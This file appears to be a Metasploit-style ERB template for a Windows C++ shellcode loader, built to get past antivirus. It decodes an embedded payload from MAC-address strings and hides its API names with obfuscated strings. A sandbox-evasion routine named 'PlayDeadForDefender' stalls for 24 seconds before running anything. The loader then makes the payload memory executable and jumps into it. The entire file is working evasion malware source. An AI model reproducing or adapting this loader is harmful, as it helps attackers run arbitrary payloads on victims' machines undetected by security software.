#include <iostream>
#include <windows.h>
#include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"

#define SCSIZE <%= payload_length %>
#define SCSIZE_ENC <%= encoded_payload_length %>

char bPayload[SCSIZE];
char bPayloadEncoded[] = "<%= encoded_payload %>";

typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
	BOOLEAN              Alertable,
	PLARGE_INTEGER       DelayInterval
);

typedef NTSTATUS (__stdcall *fnRtlEthernetStringToAddressA)(
    PCSTR              S,
    PCSTR* Terminator,
    PVOID              Addr
    );

int DecodePayload()
{
    PCSTR terminator = NULL;
    PBYTE tmp = (PBYTE)(&bPayload);

    fnRtlEthernetStringToAddressA fncMacDeobfuscate = (fnRtlEthernetStringToAddressA)GetProcAddress(LoadLibrary(OBF("ntdll.dll")), OBF("RtlEthernetStringToAddressA"));

    for (unsigned long i = 0; i != SCSIZE_ENC; i+=1) {
        fncMacDeobfuscate(bPayloadEncoded+i*18, &terminator, tmp);
        tmp = tmp + 6;
        if(i == SCSIZE_ENC)
        {
          return  1;
        }
    }

    return 1;
}

int PlayDeadForDefender()
{

    DWORD               dwMilliSeconds        = 24000;
    LARGE_INTEGER       DelayInterval         = { 0 };
    LONGLONG            Delay                 = 0;
    NTSTATUS            STATUS                = 0;
    DWORD               _T0                   = 0, 
                        _T1                   = 0;
        
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = - Delay;

    fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary((OBF("ntdll.dll"))), OBF("NtDelayExecution"));

    _T0 = GetTickCount();

    STATUS = fncNtDelayExecution(FALSE, &DelayInterval);
    
    if (STATUS != 0) {
        return 0;
    }

    _T1 = GetTickCount();

    if (_T1 - _T0 < dwMilliSeconds) {
        return 0;
    }

    return 1;
}

int main() {
    DWORD dwOldProtect;
    char* payload_fnc = NULL;
    
    if(!PlayDeadForDefender())
    {
      return 0;
    }

    DecodePayload();

    payload_fnc = bPayload;

    VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    (*(void (*)()) payload_fnc)();

    return 1;
}

